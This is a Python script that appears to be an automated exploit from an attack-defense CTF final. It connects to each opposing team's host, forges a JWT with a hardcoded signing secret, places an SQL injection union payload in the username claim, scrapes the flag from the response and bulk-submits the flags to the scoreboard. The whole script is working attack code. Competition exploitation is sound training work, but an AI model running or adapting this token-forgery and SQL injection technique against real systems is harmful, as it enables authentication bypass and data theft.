import hashlib

import jwt
import requests
from pwn import *

context.log_level = 'error'

def get_instance(team, round):
    con = remote(f"10.102.{team}.80", 5487)
    token = hashlib.sha3_512(b"2544876c41de80488474ee6f64b3f25d" + str(round).encode()).hexdigest()
    con.sendlineafter(b"> ", b"0")
    con.sendlineafter(b"> ", token.encode())
    con.recvuntil(b": ")
    return con.recvline()[:-1]

def exp1(team):
    jwt_token = jwt.encode({
        "username": "' union select 'test', FROM_UNIXTIME(1) # ",
        "poe_times": 0,
        "jwt_id": "fZL86HnQpCBAP1z1_TtSqQ"}, "superfulusecret", algorithm="HS256")

    headers = {
         "Cookie": "token=" + jwt_token
    }

    # r = requests.get("http://localhost:8081/light", headers=headers)
    r = requests.get(f"http://10.102.{team}.40:8081/light", headers=headers)

    flag = (r.text.split('\n')[33]).split('<p>')[1].strip()
    return flag


data = requests.get('https://final2024.hitconctf.com/overview').json()
round_id = data['round']['id']

flags = []
print(f"round #{round_id}")
for i in range(1, 14):
    if i == 6:
        continue
    token = get_instance(i, round_id)
    flag = exp1(i)
    flags += [ flag ]

print(requests.post("https://final2024.hitconctf.com/flag/?token=2544876c41de80488474ee6f64b3f25d&flags=" + "&flags=".join(flags)).json())